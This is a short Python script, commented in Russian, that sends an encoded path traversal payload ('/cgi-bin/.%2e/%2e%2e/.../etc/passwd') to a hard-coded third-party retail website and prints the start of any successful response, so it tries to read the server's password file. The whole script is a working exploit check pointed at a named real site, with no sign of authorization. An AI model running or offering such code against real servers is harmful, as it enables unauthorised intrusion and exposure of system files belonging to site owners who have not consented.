import requests

def check_path_traversal(base_url):
    payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    url = base_url + payload

    response = requests.get(url)

    if response.status_code == 200:
        print("[+] Потенциальная уязвимость обнаружена. Ответ сервера:")
        print(response.text[:200])  # Первые 200 символов ответа
    else:
        print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)

if __name__ == "__main__":
    target_url = "https://www.tsar-mebel.ru"  # Замените на целевой URL
    check_path_traversal(target_url)
